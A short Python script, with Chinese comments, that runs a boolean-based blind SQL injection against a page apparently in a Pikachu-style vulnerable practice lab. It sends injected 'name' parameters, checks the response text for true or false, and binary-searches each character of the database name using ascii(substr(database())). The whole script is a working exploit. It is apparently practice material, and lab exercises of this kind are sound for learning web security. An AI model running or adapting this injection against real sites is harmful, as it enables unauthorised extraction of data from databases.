import requests

url = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_blind_b.php"

def check(payload):
    params = {
        "name": payload,
        "submit": "查询"
    }
    resp = requests.get(url, params=params)
    #不存在字样 = False；没有字样 = True
    return "您输入的username不存在" not in resp.text

#测试真假
print("True测试:", check("lili' and 1=1#"))
print("False测试:", check("lili' and 1=2#"))

#二分法爆破数据库名
def get_db_char(pos):
    low, high = 32,127
    while low < high:
        mid = (low+high)//2
        p = f"lili' and ascii(substr(database(),{pos},1))>{mid}#"
        if check(p):
            low = mid + 1
        else:
            high = mid
    return chr(low)

db_name = ""
for i in range(1, 10):
    ch = get_db_char(i)
    db_name += ch
    print(f"第{i}字符: {ch}, 当前库: {db_name}")
